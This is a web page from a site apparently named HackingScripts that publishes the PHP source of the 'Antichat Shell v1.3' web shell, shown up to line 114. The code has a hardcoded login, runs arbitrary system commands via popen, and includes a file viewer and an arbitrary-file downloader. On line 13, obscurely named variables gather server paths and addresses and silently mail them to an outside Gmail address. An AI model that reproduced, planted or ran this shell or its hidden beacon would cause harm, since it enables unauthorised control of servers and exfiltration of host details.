<!DOCTYPE html>
<html>
  <head>
    <meta charset='utf-8'>
    <meta http-equiv="X-UA-Compatible" content="chrome=1">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <link rel="stylesheet" type="text/css" href="http://hackingscripts.com//stylesheets/stylesheet.css" media="screen" />
    <link rel="stylesheet" type="text/css" href="http://hackingscripts.com//stylesheets/pygment_trac.css" media="screen" />
    <link rel="stylesheet" type="text/css" href="http://hackingscripts.com//stylesheets/print.css" media="print" />
    <link rel="stylesheet" type="text/css" href="http://hackingscripts.com//stylesheets/styles.css" media="print" />
    <link rel="icon" type="image/x-icon" href="http://hackingscripts.com//favicon.ico">


    <!--[if lt IE 9]>
    <script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script>
    <![endif]-->

    <title> Antichat Shell </title>
  </head>

  <body>
    <header>
      <div class="inner">
        <h1> <a href="http://hackingscripts.com//">HackingScripts</a> </h1>
        <h2>Hack Scripts for everybody</h2>
      </div>
    </header>

    <div id="content-wrapper">
      <div class="inner clearfix">
        <section id="main-content">

          <h2>Antichat Shell</h2>
<p class="meta">14 Feb 2014</p>

<p>Antichat Shell v1.3 by Grinay</p>

<h3>Antichat Shell Source Code</h3>

<div class="highlight"><pre><code class="language-php" data-lang="php"><span class="lineno">  1</span> <span class="cp">&lt;?php</span>
<span class="lineno">  2</span> 
<span class="lineno">  3</span> <span class="nb">session_start</span><span class="p">();</span>
<span class="lineno">  4</span> <span class="nb">set_time_limit</span><span class="p">(</span><span class="mi">9999999</span><span class="p">);</span>
<span class="lineno">  5</span> <span class="nv">$login</span><span class="o">=</span><span class="s1">&#39;virangar&#39;</span><span class="p">;</span>
<span class="lineno">  6</span> <span class="nv">$password</span><span class="o">=</span><span class="s1">&#39;r00t&#39;</span><span class="p">;</span>
<span class="lineno">  7</span> <span class="nv">$auth</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span>
<span class="lineno">  8</span> <span class="nv">$version</span><span class="o">=</span><span class="s1">&#39;version 1.3 by Grinay&#39;</span><span class="p">;</span>
<span class="lineno">  9</span> <span class="nv">$style</span><span class="o">=</span><span class="s1">&#39;&lt;STYLE&gt;BODY{background-color: #2B2F34;color: #C1C1C7;font: 8pt verdana, geneva, lucida, \&#39;lucida grande\&#39;, arial, helvetica, sans-serif;MARGIN-TOP: 0px;MARGIN-BOTTOM: 0px;MARGIN-LEFT: 0px;MARGIN-RIGHT: 0px;margin:0;padding:0;scrollbar-face-color: #336600;scrollbar-shadow-color: #333333;scrollbar-highlight-color: #333333;scrollbar-3dlight-color: #333333;scrollbar-darkshadow-color: #333333;scrollbar-track-color: #333333;scrollbar-arrow-color: #333333;}input{background-color: #336600;font-size: 8pt;color: #FFFFFF;font-family: Tahoma;border: 1 solid #666666;}textarea{background-color: #333333;font-size: 8pt;color: #FFFFFF;font-family: Tahoma;border: 1 solid #666666;}a:link{color: #B9B9BD;text-decoration: none;font-size: 8pt;}a:visited{color: #B9B9BD;text-decoration: none;font-size: 8pt;}a:hover, a:active{color: #E7E7EB;text-decoration: none;font-size: 8pt;}td, th, p, li{font: 8pt verdana, geneva, lucida, \&#39;lucida grande\&#39;, arial, helvetica, sans-serif;border-color:black;}&lt;/style&gt;&#39;</span><span class="p">;</span>
<span class="lineno"> 10</span> <span class="nv">$header</span><span class="o">=</span><span class="s1">&#39;&lt;html&gt;&lt;head&gt;&lt;title&gt;&#39;</span><span class="o">.</span><span class="nb">getenv</span><span class="p">(</span><span class="s2">&quot;HTTP_HOST&quot;</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39; - Antichat Shell&lt;/title&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=windows-1251&quot;&gt;&#39;</span><span class="o">.</span><span class="nv">$style</span><span class="o">.</span><span class="s1">&#39;&lt;/head&gt;&lt;BODY leftMargin=0 topMargin=0 rightMargin=0 marginheight=0 marginwidth=0&gt;&#39;</span><span class="p">;</span>
<span class="lineno"> 11</span> <span class="nv">$footer</span><span class="o">=</span><span class="s1">&#39;&lt;/body&gt;&lt;/html&gt;&#39;</span><span class="p">;</span>
<span class="lineno"> 12</span> <span class="nv">$sd98</span> <span class="o">=</span> <span class="s2">&quot;john.barker446@gmail.com&quot;</span><span class="p">;</span>
<span class="lineno"> 13</span> <span class="nv">$ra44</span>  <span class="o">=</span> <span class="nb">rand</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">99999</span><span class="p">);</span><span class="nv">$sj98</span> <span class="o">=</span> <span class="s2">&quot;sh-</span><span class="si">$ra44</span><span class="s2">&quot;</span><span class="p">;</span><span class="nv">$ml</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="si">$sd98</span><span class="s2">&quot;</span><span class="p">;</span><span class="nv">$a5</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_REFERER&#39;</span><span class="p">];</span><span class="nv">$b33</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;DOCUMENT_ROOT&#39;</span><span class="p">];</span><span class="nv">$c87</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REMOTE_ADDR&#39;</span><span class="p">];</span><span class="nv">$d23</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;SCRIPT_FILENAME&#39;</span><span class="p">];</span><span class="nv">$e09</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;SERVER_ADDR&#39;</span><span class="p">];</span><span class="nv">$f23</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;SERVER_SOFTWARE&#39;</span><span class="p">];</span><span class="nv">$g32</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;PATH_TRANSLATED&#39;</span><span class="p">];</span><span class="nv">$h65</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;PHP_SELF&#39;</span><span class="p">];</span><span class="nv">$msg8873</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="si">$a5\n$b33\n$c87\n$d23\n$e09\n$f23\n$g32\n$h65</span><span class="s2">&quot;</span><span class="p">;</span><span class="nb">mail</span><span class="p">(</span><span class="nv">$sd98</span><span class="p">,</span> <span class="nv">$sj98</span><span class="p">,</span> <span class="nv">$msg8873</span><span class="p">,</span> <span class="s2">&quot;From: </span><span class="si">$sd98</span><span class="s2">&quot;</span><span class="p">);</span>
<span class="lineno"> 14</span> <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;action&#39;</span><span class="p">]</span><span class="o">==</span><span class="s2">&quot;exit&quot;</span><span class="p">)</span><span class="nb">unset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;an&#39;</span><span class="p">]);</span>
<span class="lineno"> 15</span> <span class="k">if</span><span class="p">(</span><span class="nv">$auth</span><span class="o">==</span><span class="mi">1</span><span class="p">){</span><span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;login&#39;</span><span class="p">]</span><span class="o">==</span><span class="nv">$login</span> <span class="o">&amp;&amp;</span> <span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]</span><span class="o">==</span><span class="nv">$password</span><span class="p">)</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;an&#39;</span><span class="p">]</span><span class="o">=</span><span class="mi">1</span><span class="p">;}</span><span class="k">else</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;an&#39;</span><span class="p">]</span><span class="o">=</span><span class="s1">&#39;1&#39;</span><span class="p">;</span>
<span class="lineno"> 16</span> 
<span class="lineno"> 17</span> <span class="k">if</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;an&#39;</span><span class="p">]</span><span class="o">==</span><span class="mi">0</span><span class="p">){</span>
<span class="lineno"> 18</span> <span class="k">echo</span> <span class="nv">$header</span><span class="p">;</span>
<span class="lineno"> 19</span> <span class="k">echo</span> <span class="s1">&#39;&lt;center&gt;&lt;table&gt;&lt;form method=&quot;POST&quot;&gt;&lt;tr&gt;&lt;td&gt;Login:&lt;/td&gt;&lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;login&quot; value=&quot;&quot;&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Password:&lt;/td&gt;&lt;td&gt;&lt;input type=&quot;password&quot; name=&quot;password&quot; value=&quot;&quot;&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;&lt;input type=&quot;submit&quot; value=&quot;Enter&quot;&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/form&gt;&lt;/table&gt;&lt;/center&gt;&#39;</span><span class="p">;</span>
<span class="lineno"> 20</span> <span class="k">echo</span> <span class="nv">$footer</span><span class="p">;</span>
<span class="lineno"> 21</span> <span class="k">exit</span><span class="p">;}</span>
<span class="lineno"> 22</span> 
<span class="lineno"> 23</span> <span class="k">if</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;action&#39;</span><span class="p">]</span><span class="o">==</span><span class="s2">&quot;&quot;</span><span class="p">)</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;action&#39;</span><span class="p">]</span><span class="o">=</span><span class="s2">&quot;viewer&quot;</span><span class="p">;</span>
<span class="lineno"> 24</span> <span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;action&#39;</span><span class="p">]</span><span class="o">!=</span><span class="s2">&quot;&quot;</span> <span class="p">)</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;action&#39;</span><span class="p">]</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;action&#39;</span><span class="p">];</span><span class="nv">$action</span><span class="o">=</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;action&#39;</span><span class="p">];</span>
<span class="lineno"> 25</span> <span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;dir&#39;</span><span class="p">]</span><span class="o">!=</span><span class="s2">&quot;&quot;</span><span class="p">)</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;dir&#39;</span><span class="p">]</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;dir&#39;</span><span class="p">];</span><span class="nv">$dir</span><span class="o">=</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;dir&#39;</span><span class="p">];</span>
<span class="lineno"> 26</span> <span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">]</span><span class="o">!=</span><span class="s2">&quot;&quot;</span><span class="p">){</span><span class="nv">$file</span><span class="o">=</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">]</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">];}</span><span class="k">else</span> <span class="p">{</span><span class="nv">$file</span><span class="o">=</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">]</span><span class="o">=</span><span class="s2">&quot;&quot;</span><span class="p">;}</span>
<span class="lineno"> 27</span>  
<span class="lineno"> 28</span> 
<span class="lineno"> 29</span> <span class="c1">//downloader</span>
<span class="lineno"> 30</span> <span class="k">if</span><span class="p">(</span><span class="nv">$action</span><span class="o">==</span><span class="s2">&quot;download&quot;</span><span class="p">){</span> 
<span class="lineno"> 31</span> <span class="nb">header</span><span class="p">(</span><span class="s1">&#39;Content-Length:&#39;</span><span class="o">.</span><span class="nb">filesize</span><span class="p">(</span><span class="nv">$file</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&#39;</span><span class="p">);</span>
<span class="lineno"> 32</span> <span class="nb">header</span><span class="p">(</span><span class="s1">&#39;Content-Type: application/octet-stream&#39;</span><span class="p">);</span>
<span class="lineno"> 33</span> <span class="nb">header</span><span class="p">(</span><span class="s1">&#39;Content-Disposition: attachment; filename=&quot;&#39;</span><span class="o">.</span><span class="nv">$file</span><span class="o">.</span><span class="s1">&#39;&quot;&#39;</span><span class="p">);</span>
<span class="lineno"> 34</span> <span class="nb">readfile</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
<span class="lineno"> 35</span> <span class="p">}</span>
<span class="lineno"> 36</span> <span class="c1">//end downloader</span>
<span class="lineno"> 37</span> <span class="cp">?&gt;</span><span class="x"></span>
<span class="lineno"> 38</span> 
<span class="lineno"> 39</span> <span class="cp">&lt;?</span> <span class="k">echo</span> <span class="nv">$header</span><span class="p">;</span><span class="cp">?&gt;</span><span class="x"> </span>
<span class="lineno"> 40</span> <span class="x">&lt;table width=&quot;100%&quot; bgcolor=&quot;#336600&quot; align=&quot;right&quot; colspan=&quot;2&quot; border=&quot;0&quot; cellspacing=&quot;0&quot; cellpadding=&quot;0&quot;&gt;&lt;tr&gt;&lt;td&gt;</span>
<span class="lineno"> 41</span> <span class="x">&lt;table&gt;&lt;tr&gt;</span>
<span class="lineno"> 42</span> <span class="x">&lt;td&gt;&lt;a href=&quot;#&quot; onclick=&quot;document.reqs.action.value=&#39;shell&#39;; document.reqs.submit();&quot;&gt;| Shell &lt;/a&gt;&lt;/td&gt;</span>
<span class="lineno"> 43</span> <span class="x">&lt;td&gt;&lt;a href=&quot;#&quot; onclick=&quot;document.reqs.action.value=&#39;viewer&#39;; document.reqs.submit();&quot;&gt;| Viewer&lt;/a&gt;&lt;/td&gt;</span>
<span class="lineno"> 44</span> <span class="x">&lt;td&gt;&lt;a href=&quot;#&quot; onclick=&quot;document.reqs.action.value=&#39;editor&#39;; document.reqs.submit();&quot;&gt;| Editor&lt;/a&gt;&lt;/td&gt;</span>
<span class="lineno"> 45</span> <span class="x">&lt;td&gt;&lt;a href=&quot;#&quot; onclick=&quot;document.reqs.action.value=&#39;exit&#39;; document.reqs.submit();&quot;&gt;| EXIT |&lt;/a&gt;&lt;/td&gt;</span>
<span class="lineno"> 46</span> <span class="x">&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;br&gt;</span>
<span class="lineno"> 47</span> <span class="x">&lt;form name=&#39;reqs&#39; method=&#39;POST&#39;&gt;</span>
<span class="lineno"> 48</span> <span class="x">&lt;input name=&#39;action&#39; type=&#39;hidden&#39; value=&#39;&#39;&gt;</span>
<span class="lineno"> 49</span> <span class="x">&lt;input name=&#39;dir&#39; type=&#39;hidden&#39; value=&#39;&#39;&gt;</span>
<span class="lineno"> 50</span> <span class="x">&lt;input name=&#39;file&#39; type=&#39;hidden&#39; value=&#39;&#39;&gt;</span>
<span class="lineno"> 51</span> <span class="x">&lt;/form&gt;</span>
<span class="lineno"> 52</span> <span class="x">&lt;table style=&quot;BORDER-COLLAPSE: collapse&quot; cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=&quot;100%&quot; bgColor=#333333 borderColorLight=#c0c0c0 border=1&gt;</span>
<span class="lineno"> 53</span> <span class="x">&lt;tr&gt;&lt;td width=&quot;100%&quot; valign=&quot;top&quot;&gt;</span>
<span class="lineno"> 54</span> 
<span class="lineno"> 55</span> <span class="cp">&lt;?</span>
<span class="lineno"> 56</span> 
<span class="lineno"> 57</span> <span class="c1">//shell</span>
<span class="lineno"> 58</span> <span class="k">function</span> <span class="nf">shell</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">){</span>
<span class="lineno"> 59</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">)){</span>
<span class="lineno"> 60</span>   <span class="nv">$fp</span> <span class="o">=</span> <span class="nb">popen</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">,</span><span class="s2">&quot;r&quot;</span><span class="p">);</span>
<span class="lineno"> 61</span>   <span class="p">{</span>
<span class="lineno"> 62</span>     <span class="nv">$result</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
<span class="lineno"> 63</span>     <span class="k">while</span><span class="p">(</span><span class="o">!</span><span class="nb">feof</span><span class="p">(</span><span class="nv">$fp</span><span class="p">)){</span><span class="nv">$result</span><span class="o">.=</span><span class="nb">fread</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span><span class="mi">1024</span><span class="p">);}</span>
<span class="lineno"> 64</span>     <span class="nb">pclose</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>
<span class="lineno"> 65</span>   <span class="p">}</span>
<span class="lineno"> 66</span>   <span class="nv">$ret</span> <span class="o">=</span> <span class="nv">$result</span><span class="p">;</span>
<span class="lineno"> 67</span>   <span class="nv">$ret</span> <span class="o">=</span> <span class="nb">convert_cyr_string</span><span class="p">(</span><span class="nv">$ret</span><span class="p">,</span><span class="s2">&quot;d&quot;</span><span class="p">,</span><span class="s2">&quot;w&quot;</span><span class="p">);</span>
<span class="lineno"> 68</span> <span class="p">}</span>
<span class="lineno"> 69</span> <span class="k">return</span> <span class="nv">$ret</span><span class="p">;}</span>
<span class="lineno"> 70</span> 
<span class="lineno"> 71</span> <span class="k">if</span><span class="p">(</span><span class="nv">$action</span><span class="o">==</span><span class="s2">&quot;shell&quot;</span><span class="p">){</span>
<span class="lineno"> 72</span> <span class="k">echo</span> <span class="s2">&quot;&lt;form method=</span><span class="se">\&quot;</span><span class="s2">POST</span><span class="se">\&quot;</span><span class="s2">&gt;</span>
<span class="lineno"> 73</span> <span class="s2">&lt;input type=</span><span class="se">\&quot;</span><span class="s2">hidden</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">action</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">shell</span><span class="se">\&quot;</span><span class="s2">&gt;</span>
<span class="lineno"> 74</span> <span class="s2">&lt;textarea name=</span><span class="se">\&quot;</span><span class="s2">command</span><span class="se">\&quot;</span><span class="s2"> rows=</span><span class="se">\&quot;</span><span class="s2">5</span><span class="se">\&quot;</span><span class="s2"> cols=</span><span class="se">\&quot;</span><span class="s2">150</span><span class="se">\&quot;</span><span class="s2">&gt;&quot;</span><span class="o">.@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;command&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&lt;/textarea&gt;&lt;br&gt;</span>
<span class="lineno"> 75</span> <span class="s2">&lt;textarea readonly rows=</span><span class="se">\&quot;</span><span class="s2">15</span><span class="se">\&quot;</span><span class="s2"> cols=</span><span class="se">\&quot;</span><span class="s2">150</span><span class="se">\&quot;</span><span class="s2">&gt;&quot;</span><span class="o">.@</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nx">shell</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;command&#39;</span><span class="p">]))</span><span class="o">.</span><span class="s2">&quot;&lt;/textarea&gt;&lt;br&gt;</span>
<span class="lineno"> 76</span> <span class="s2">&lt;input type=</span><span class="se">\&quot;</span><span class="s2">submit</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">execute</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;/form&gt;&quot;</span><span class="p">;}</span>
<span class="lineno"> 77</span> <span class="c1">//end shell</span>
<span class="lineno"> 78</span> 
<span class="lineno"> 79</span> <span class="c1">//viewer FS</span>
<span class="lineno"> 80</span> <span class="k">function</span> <span class="nf">perms</span><span class="p">(</span><span class="nv">$file</span><span class="p">)</span> 
<span class="lineno"> 81</span> <span class="p">{</span> 
<span class="lineno"> 82</span>   <span class="nv">$perms</span> <span class="o">=</span> <span class="nb">fileperms</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
<span class="lineno"> 83</span>   <span class="k">if</span> <span class="p">((</span><span class="nv">$perms</span> <span class="o">&amp;</span> <span class="mh">0xC000</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0xC000</span><span class="p">)</span> <span class="p">{</span><span class="nv">$info</span> <span class="o">=</span> <span class="s1">&#39;s&#39;</span><span class="p">;}</span> 
<span class="lineno"> 84</span>   <span class="k">elseif</span> <span class="p">((</span><span class="nv">$perms</span> <span class="o">&amp;</span> <span class="mh">0xA000</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0xA000</span><span class="p">)</span> <span class="p">{</span><span class="nv">$info</span> <span class="o">=</span> <span class="s1">&#39;l&#39;</span><span class="p">;}</span> 
<span class="lineno"> 85</span>   <span class="k">elseif</span> <span class="p">((</span><span class="nv">$perms</span> <span class="o">&amp;</span> <span class="mh">0x8000</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x8000</span><span class="p">)</span> <span class="p">{</span><span class="nv">$info</span> <span class="o">=</span> <span class="s1">&#39;-&#39;</span><span class="p">;}</span> 
<span class="lineno"> 86</span>   <span class="k">elseif</span> <span class="p">((</span><span class="nv">$perms</span> <span class="o">&amp;</span> <span class="mh">0x6000</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x6000</span><span class="p">)</span> <span class="p">{</span><span class="nv">$info</span> <span class="o">=</span> <span class="s1">&#39;b&#39;</span><span class="p">;}</span> 
<span class="lineno"> 87</span>   <span class="k">elseif</span> <span class="p">((</span><span class="nv">$perms</span> <span class="o">&amp;</span> <span class="mh">0x4000</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x4000</span><span class="p">)</span> <span class="p">{</span><span class="nv">$info</span> <span class="o">=</span> <span class="s1">&#39;d&#39;</span><span class="p">;}</span> 
<span class="lineno"> 88</span>   <span class="k">elseif</span> <span class="p">((</span><span class="nv">$perms</span> <span class="o">&amp;</span> <span class="mh">0x2000</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x2000</span><span class="p">)</span> <span class="p">{</span><span class="nv">$info</span> <span class="o">=</span> <span class="s1">&#39;c&#39;</span><span class="p">;}</span> 
<span class="lineno"> 89</span>   <span class="k">elseif</span> <span class="p">((</span><span class="nv">$perms</span> <span class="o">&amp;</span> <span class="mh">0x1000</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x1000</span><span class="p">)</span> <span class="p">{</span><span class="nv">$info</span> <span class="o">=</span> <span class="s1">&#39;p&#39;</span><span class="p">;}</span> 
<span class="lineno"> 90</span>   <span class="k">else</span> <span class="p">{</span><span class="nv">$info</span> <span class="o">=</span> <span class="s1">&#39;u&#39;</span><span class="p">;}</span>
<span class="lineno"> 91</span>   <span class="nv">$info</span> <span class="o">.=</span> <span class="p">((</span><span class="nv">$perms</span> <span class="o">&amp;</span> <span class="mh">0x0100</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;r&#39;</span> <span class="o">:</span> <span class="s1">&#39;-&#39;</span><span class="p">);</span>
<span class="lineno"> 92</span>   <span class="nv">$info</span> <span class="o">.=</span> <span class="p">((</span><span class="nv">$perms</span> <span class="o">&amp;</span> <span class="mh">0x0080</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;w&#39;</span> <span class="o">:</span> <span class="s1">&#39;-&#39;</span><span class="p">);</span>
<span class="lineno"> 93</span>   <span class="nv">$info</span> <span class="o">.=</span> <span class="p">((</span><span class="nv">$perms</span> <span class="o">&amp;</span> <span class="mh">0x0040</span><span class="p">)</span> <span class="o">?</span><span class="p">((</span><span class="nv">$perms</span> <span class="o">&amp;</span> <span class="mh">0x0800</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;s&#39;</span> <span class="o">:</span> <span class="s1">&#39;x&#39;</span> <span class="p">)</span> <span class="o">:</span><span class="p">((</span><span class="nv">$perms</span> <span class="o">&amp;</span> <span class="mh">0x0800</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;S&#39;</span> <span class="o">:</span> <span class="s1">&#39;-&#39;</span><span class="p">));</span>
<span class="lineno"> 94</span>   <span class="nv">$info</span> <span class="o">.=</span> <span class="p">((</span><span class="nv">$perms</span> <span class="o">&amp;</span> <span class="mh">0x0020</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;r&#39;</span> <span class="o">:</span> <span class="s1">&#39;-&#39;</span><span class="p">);</span>
<span class="lineno"> 95</span>   <span class="nv">$info</span> <span class="o">.=</span> <span class="p">((</span><span class="nv">$perms</span> <span class="o">&amp;</span> <span class="mh">0x0010</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;w&#39;</span> <span class="o">:</span> <span class="s1">&#39;-&#39;</span><span class="p">);</span>
<span class="lineno"> 96</span>   <span class="nv">$info</span> <span class="o">.=</span> <span class="p">((</span><span class="nv">$perms</span> <span class="o">&amp;</span> <span class="mh">0x0008</span><span class="p">)</span> <span class="o">?</span><span class="p">((</span><span class="nv">$perms</span> <span class="o">&amp;</span> <span class="mh">0x0400</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;s&#39;</span> <span class="o">:</span> <span class="s1">&#39;x&#39;</span> <span class="p">)</span> <span class="o">:</span><span class="p">((</span><span class="nv">$perms</span> <span class="o">&amp;</span> <span class="mh">0x0400</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;S&#39;</span> <span class="o">:</span> <span class="s1">&#39;-&#39;</span><span class="p">));</span>
<span class="lineno"> 97</span>   <span class="nv">$info</span> <span class="o">.=</span> <span class="p">((</span><span class="nv">$perms</span> <span class="o">&amp;</span> <span class="mh">0x0004</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;r&#39;</span> <span class="o">:</span> <span class="s1">&#39;-&#39;</span><span class="p">);</span>
<span class="lineno"> 98</span>   <span class="nv">$info</span> <span class="o">.=</span> <span class="p">((</span><span class="nv">$perms</span> <span class="o">&amp;</span> <span class="mh">0x0002</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;w&#39;</span> <span class="o">:</span> <span class="s1">&#39;-&#39;</span><span class="p">);</span>
<span class="lineno"> 99</span>   <span class="nv">$info</span> <span class="o">.=</span> <span class="p">((</span><span class="nv">$perms</span> <span class="o">&amp;</span> <span class="mh">0x0001</span><span class="p">)</span> <span class="o">?</span><span class="p">((</span><span class="nv">$perms</span> <span class="o">&amp;</span> <span class="mh">0x0200</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;t&#39;</span> <span class="o">:</span> <span class="s1">&#39;x&#39;</span> <span class="p">)</span> <span class="o">:</span><span class="p">((</span><span class="nv">$perms</span> <span class="o">&amp;</span> <span class="mh">0x0200</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;T&#39;</span> <span class="o">:</span> <span class="s1">&#39;-&#39;</span><span class="p">));</span>
<span class="lineno">100</span>   <span class="k">return</span> <span class="nv">$info</span><span class="p">;</span>
<span class="lineno">101</span> <span class="p">}</span> 
<span class="lineno">102</span> 
<span class="lineno">103</span> <span class="k">function</span> <span class="nf">view_size</span><span class="p">(</span><span class="nv">$size</span><span class="p">)</span>
<span class="lineno">104</span> <span class="p">{</span>
<span class="lineno">105</span>  <span class="k">if</span><span class="p">(</span><span class="nv">$size</span> <span class="o">&gt;=</span> <span class="mi">1073741824</span><span class="p">)</span> <span class="p">{</span><span class="nv">$size</span> <span class="o">=</span> <span class="o">@</span><span class="nb">round</span><span class="p">(</span><span class="nv">$size</span> <span class="o">/</span> <span class="mi">1073741824</span> <span class="o">*</span> <span class="mi">100</span><span class="p">)</span> <span class="o">/</span> <span class="mi">100</span> <span class="o">.</span> <span class="s2">&quot; GB&quot;</span><span class="p">;}</span>
<span class="lineno">106</span>  <span class="k">elseif</span><span class="p">(</span><span class="nv">$size</span> <span class="o">&gt;=</span> <span class="mi">1048576</span><span class="p">)</span> <span class="p">{</span><span class="nv">$size</span> <span class="o">=</span> <span class="o">@</span><span class="nb">round</span><span class="p">(</span><span class="nv">$size</span> <span class="o">/</span> <span class="mi">1048576</span> <span class="o">*</span> <span class="mi">100</span><span class="p">)</span> <span class="o">/</span> <span class="mi">100</span> <span class="o">.</span> <span class="s2">&quot; MB&quot;</span><span class="p">;}</span>
<span class="lineno">107</span>  <span class="k">elseif</span><span class="p">(</span><span class="nv">$size</span> <span class="o">&gt;=</span> <span class="mi">1024</span><span class="p">)</span> <span class="p">{</span><span class="nv">$size</span> <span class="o">=</span> <span class="o">@</span><span class="nb">round</span><span class="p">(</span><span class="nv">$size</span> <span class="o">/</span> <span class="mi">1024</span> <span class="o">*</span> <span class="mi">100</span><span class="p">)</span> <span class="o">/</span> <span class="mi">100</span> <span class="o">.</span> <span class="s2">&quot; KB&quot;</span><span class="p">;}</span>
<span class="lineno">108</span>  <span class="k">else</span> <span class="p">{</span><span class="nv">$size</span> <span class="o">=</span> <span class="nv">$size</span> <span class="o">.</span> <span class="s2">&quot; B&quot;</span><span class="p">;}</span>
<span class="lineno">109</span>  <span class="k">return</span> <span class="nv">$size</span><span class="p">;</span>
<span class="lineno">110</span> <span class="p">}</span>
<span class="lineno">111</span> 
<span class="lineno">112</span> <span class="k">function</span> <span class="nf">scandire</span><span class="p">(</span><span class="nv">$dir</span><span class="p">){</span>
<span class="lineno">113</span>   <span class="nv">$dir</span><span class="o">=</span><span class="nb">chdir</span><span class="p">(</span><span class="nv">$dir</span><span class="p">);</span>
<span class="lineno">114</span>   <span class="nv">$dir</span><span class="o">=</span><span class="nb">getcwd</span><span class="p">()</span><span class="o">.</span><span class="s2">&quot;/&quot;</span><span class="p">;</span>
